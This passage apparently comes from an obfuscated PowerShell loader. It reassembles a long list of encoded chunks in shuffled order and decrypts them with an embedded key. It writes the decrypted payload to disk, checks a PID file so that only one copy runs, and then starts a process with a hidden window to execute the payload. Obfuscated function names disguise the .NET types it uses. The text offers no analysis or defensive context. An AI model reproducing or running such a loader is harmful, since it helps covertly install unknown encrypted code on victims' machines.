        "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",
        "4GHAmTE5637q0fsGzc9crb+w56mbHBD53h1sqgqAqqomMHO8yOkX76",
        "W2Nlx9dmHELbRva9u7WddrlGzuGUEcWfJWktyncr5iwTC56YKNeuKc",
        "8WtwkrdLkEasKQtyqd4SHhuHpebdMw/rZjv6bghB5bxbL9hWSG8Yzl",
        "iW0If5uFtSOUiH00Nr6//8VvbryIFFnHyOi3CDKMcBxQvyHGWg0lCl",
        "BD5rEz/uC3S0Yn0S82yiKMmxuxZfsLe0OWFwm8ft/fz490ZVXUm9GA",
        "KuUHF8zX6jshLPnPvIuFb6vzTx8aofw3fZygH9did4LS6UcgTbfyjr",
        "T6Xs/u+Ma7i15eItOodoYrr/IXDiL92uoW3d3L6OQWJld2CrV3hfwn",
        "VD+uJz5CihojdMhe+fUucIri4jpljG7jYi5HZnkLgaPjH8Qnz9VnSO",
        "6JZ0i1fXCuTDAR9UZMJXg4o3QQUap+d0KN63JJbbA2759Xi/Ycn2iO",
        "VX54rLJBgteOgxL0ovle9ZnoSo/zgLAVRe1JNgMS7x0HadkKwN7Itn",
        "xZaQupyh3URXsZPon3vkMcpps5rl9i6DxTd1YP6f8MCr2kTdNvmsae",
        "ZJgdNpJIS3xXMkzv4z/053XU0XEbRmJXPj7Uc3pzXNZrlDGCVOdZgJ",
        "g9l2m/dFLRt5GcA+st8MX8m5tqED/8PtgZhXO3ZLAzN4wAdYHfOrFO",
        "D9N/e0wWvoZ8qax+yTJhV0ix1LMz+GCPQ6ybHZYGyhfAkuPD0edZdw",
        "Z/yg/nr1qElzpjPeJ3zzx/WuNLP7mkQv6KFSrjNMe4s0Z7ffdiSFF8",
        "erKbRQPiSC8v610w7RKxDGoES+ruzn8yQB2nC0BMnhAEBWADquPCzz",
        "OqM/iqW9Fot8clhUZWnYyN+jXLl7zaKkR1KchePmjGcLV7uUlKAIg5",
        "GSRLS0we4Ppxct6cBTYWY2SoJFkeOJl32hV0TzQ10tK0NYK8NJMhoa",
        "2DfIJb8mZiRAwbM0yX7Dz0Sy2JSef4Ec5TJf60iB3h5ZPgik7aAeJu",
        "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"
    )
    $wpghcfvw = @(46,54,264,94,78,202,242,283,128,95,39,223,219,232,132,17,239,146,27,225,156,144,263,185,33,189,117,36,88,153,22,119,179,151,161,80,270,69,121,268,74,118,71,234,157,26,191,192,175,101,20,167,200,56,193,19,112,152,14,133,217,170,125,235,210,281,10,222,50,5,11,273,59,228,166,52,285,145,214,76,149,168,67,226,292,201,165,99,190,267,38,139,130,123,256,174,114,107,199,1,3,177,251,162,172,227,218,187,272,260,104,148,120,58,31,25,129,154,13,249,213,131,127,155,16,30,284,12,41,188,116,49,186,198,159,21,240,241,124,278,75,171,81,79,23,279,150,55,73,2,196,291,173,221,276,203,109,134,85,160,72,286,64,105,62,28,68,280,244,252,87,141,18,269,142,255,96,184,147,220,246,274,194,258,180,250,102,182,100,61,253,248,215,29,51,230,97,176,111,40,42,137,86,66,290,15,178,115,90,138,195,206,262,82,265,60,110,37,224,35,236,103,98,231,275,91,163,126,63,282,143,136,0,83,9,216,24,70,277,6,106,158,93,204,254,266,53,209,212,122,259,44,113,57,229,261,207,32,77,135,183,7,47,8,237,289,245,65,197,34,208,238,288,92,205,89,43,287,243,247,233,84,140,48,4,211,108,169,181,271,164,257,45)
    $papoipme = -join ($wpghcfvw | ForEach-Object { $zyhdyqxl[$_] })
    $nsfiqezi = "xNsUGgtGtSK88FoPJB/PvdWtOqbDWAuPADhKZGkMIzBW/Pi9Xb8xKn1iXxPgOny/XX1t5GzPLAsgkVPXtet9jw=="
    $maztkcdg = ajsbjbxaif -pzbbvnpa $papoipme -pnyjvopt $nsfiqezi
    if ($maztkcdg) {
        (((aopepqgmde 25)) -as [type])::WriteAllText($cfdkauoe, $maztkcdg, (((aopepqgmde 19)) -as [type])::UTF8)
    }
    if ((Test-Path $cfdkauoe) -and (Test-Path $mhyqlcce)) {
        $dfsvshsm = Join-Path $tpggxqsn (aopepqgmde 29)
        $vgkhrbmq = $false
        if (Test-Path $dfsvshsm) {
            try {
                $hnzucwbn = [int](Get-Content $dfsvshsm -Raw -ErrorAction Stop).Trim()
                $tbpulauz = Get-Process -Id $hnzucwbn -ErrorAction SilentlyContinue
                if ($tbpulauz -and !$tbpulauz.HasExited) { $vgkhrbmq = $true }
            } catch {}
        }
        if (!$vgkhrbmq) {
            $hoeqxoax = New-Object (aopepqgmde 4)
            $hoeqxoax.FileName = $mhyqlcce
            $hoeqxoax.Arguments = '"' + $cfdkauoe + '"'
            $hoeqxoax.WorkingDirectory = $tpggxqsn
            $hoeqxoax.WindowStyle = [Enum]::Parse((((aopepqgmde 5)) -as [type]), (aopepqgmde 6))
            $hoeqxoax.CreateNoWindow = $true
            $hoeqxoax.UseShellExecute = $false
            $nxfdxxiy = New-Object (aopepqgmde 7)
            $nxfdxxiy.StartInfo = $hoeqxoax
            [void]$nxfdxxiy.Start()
            try { (((aopepqgmde 25)) -as [type])::WriteAllText($dfsvshsm, $nxfdxxiy.Id.ToString()) } catch {}
        }
    }
} catch {
    Write-DebugLog "Error: $($_.Exception.Message)"
}